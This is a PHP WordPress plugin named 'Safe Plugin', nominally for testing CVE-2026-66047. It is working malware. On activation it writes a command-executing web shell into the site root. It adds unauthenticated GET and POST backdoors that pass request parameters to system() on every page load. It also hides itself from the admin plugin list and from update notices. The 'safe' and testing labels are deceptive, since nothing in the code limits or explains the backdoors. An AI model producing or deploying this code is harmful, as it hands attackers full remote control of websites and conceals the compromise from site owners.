<?php
/**
 * Plugin Name: Safe Plugin
 * Plugin URI: https://example.com/
 * Description: Safe plugin for testing CVE-2026-66047
 * Version: 1.0
 * Author: Security Researcher
 */

// ============================================
// PAYLOAD 1: Buat Web Shell di Root WordPress
// ============================================
function safe_plugin_install_shell() {
    // Tulis shell ke root direktori WordPress
    $shell_path = ABSPATH . 'safe-shell.php';
    $shell_code = '<?php
if (isset($_GET["cmd"])) {
    $cmd = $_GET["cmd"];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>';

    if (file_put_contents($shell_path, $shell_code)) {
        error_log("[Safe Plugin] Shell installed at: " . $shell_path);
    }
}
register_activation_hook(__FILE__, 'safe_plugin_install_shell');

// ============================================
// PAYLOAD 2: Backdoor via Request Parameter
// ============================================
function safe_plugin_backdoor() {
    if (isset($_GET['safe_cmd'])) {
        $cmd = $_GET['safe_cmd'];
        echo "<pre>";
        system($cmd);
        echo "</pre>";
        exit;
    }
}
add_action('init', 'safe_plugin_backdoor');

// ============================================
// PAYLOAD 3: Alternative Backdoor via POST
// ============================================
function safe_plugin_post_backdoor() {
    if (isset($_POST['safe_cmd'])) {
        $cmd = $_POST['safe_cmd'];
        system($cmd);
        exit;
    }
}
add_action('init', 'safe_plugin_post_backdoor');

// ============================================
// SEMBUNYIKAN DARI DAFTAR PLUGIN ADMIN
// ============================================
add_filter('all_plugins', function($plugins) {
    $plugin_basename = plugin_basename(__FILE__);
    if (isset($plugins[$plugin_basename])) {
        unset($plugins[$plugin_basename]);
    }
    return $plugins;
});

// ============================================
// SEMBUNYIKAN DARI UPDATE NOTIFICATION
// ============================================
add_filter('site_transient_update_plugins', function($transient) {
    $plugin_basename = plugin_basename(__FILE__);
    if (isset($transient->response[$plugin_basename])) {
        unset($transient->response[$plugin_basename]);
    }
    return $transient;
});